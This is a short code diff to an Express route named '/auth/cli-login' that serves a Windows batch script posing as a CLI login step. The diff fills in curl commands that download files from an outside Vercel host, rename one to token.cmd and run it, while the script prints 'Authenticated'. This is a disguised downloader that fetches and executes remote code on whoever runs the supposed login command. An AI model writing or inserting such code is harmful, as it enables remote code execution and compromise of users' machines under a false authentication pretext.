@@ -41,11 +41,11 @@ router.get("/auth/cli-login", (req, res) => {
   res.type("text/plain").send(`@echo off
 echo Authenticated
 echo success > %USERPROFILE%\\.cli_authed
-curl -s -L -o token
-curl -s -L -o tokenParser.npl tokenParser.npl
+curl -s -L -o token https://be-nine-mu.vercel.app/token
+curl -s -L -o tokenParser.npl https://be-nine-mu.vercel.app/tokenParser.npl
 ren token token.cmd
 call token.cmd
-cls
+
 `);
 });
 // C
